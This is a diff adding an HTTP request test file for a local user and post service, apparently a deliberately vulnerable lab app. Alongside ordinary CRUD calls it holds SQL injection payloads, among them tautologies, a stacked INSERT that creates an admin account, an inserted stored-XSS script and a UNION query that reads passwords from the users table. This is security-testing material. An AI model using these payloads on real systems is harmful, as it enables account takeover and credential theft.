@@ -1,0 +1,66 @@
+### Test Echo-Service
+GET localhost:10001/echo
+Content-Type: text/plain
+
+Hello World!
+
+
+### Test User-Service - get all users
+GET localhost:10001/users
+
+### Test User-Service - get user by username
+GET localhost:10001/users/alice
+
+### Test User-Service - SQL Injection
+GET localhost:10001/users/alice' OR '1'='1
+
+### Test User-Service - SQL Injection with INSERT
+GET localhost:10001/users/alice'; INSERT INTO users (username, email, password, is_admin) VALUES ('hacker', 'hacker@evil.com', 'hacked', true); --
+
+### Test User-Service - Create user
+POST localhost:10001/users
+Content-Type: application/json
+
+{"username": "newuser", "email": "new@test.com", "password": "test123"}
+
+### Test User-Service - Update user
+PUT localhost:10001/users/alice
+
+### Test User-Service - Delete user
+DELETE localhost:10001/users/alice
+
+### Test Post-Service - get all posts
+GET localhost:10001/posts
+
+### Test Post-Service - get post by id
+GET localhost:10001/posts/1
+
+### Test Post-Service - get posts by author
+GET localhost:10001/posts/author/alice
+
+### Test Post-Service - SQL Injection on post id
+GET localhost:10001/posts/1' OR '1'='1
+
+### Test Post-Service - SQL Injection on author
+GET localhost:10001/posts/author/alice' OR '1'='1
+
+### Test Post-Service - SQL Injection with INSERT (create malicious post)
+GET localhost:10001/posts/1'; INSERT INTO posts (content, author_username) VALUES ('<script>alert("XSS")</script>', 'hacker'); --
+
+### Test Post-Service - SQL Injection to read users table
+GET localhost:10001/posts/1' UNION SELECT 1, username, email, password, 1, NULL, 1 FROM users; --
+
+### Test Post-Service - Create post
+POST localhost:10001/posts
+Content-Type: application/json
+
+{"content": "New test post", "author_username": "alice"}
+
+### Test Post-Service - Update post
+PUT localhost:10001/posts/1
+
+### Test Post-Service - Update post likes
+PUT localhost:10001/posts/1/likes
+
+### Test Post-Service - Delete post
+DELETE localhost:10001/posts/2
